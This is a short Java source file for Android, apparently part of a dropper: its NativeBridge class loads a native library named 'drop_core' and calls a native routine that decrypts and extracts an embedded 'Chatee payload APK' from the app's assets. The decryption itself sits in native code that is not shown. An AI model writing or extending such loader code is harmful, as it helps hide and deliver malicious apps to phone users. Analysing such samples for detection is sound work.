package com.pkg.loader.dispatch.internal;

/** Native decrypt of embedded Chatee payload APK. */
public final class NativeBridge {
    private NativeBridge() {}

    private static boolean loaded;

    private static void load() {
        if (loaded) {
            return;
        }
        System.loadLibrary("drop_core");
        loaded = true;
    }

    public static boolean extractPayload(android.content.res.AssetManager assets, String outPath) {
        load();
        return nativeExtract(assets, outPath);
    }

    private static native boolean nativeExtract(
        android.content.res.AssetManager assets, String outPath);
}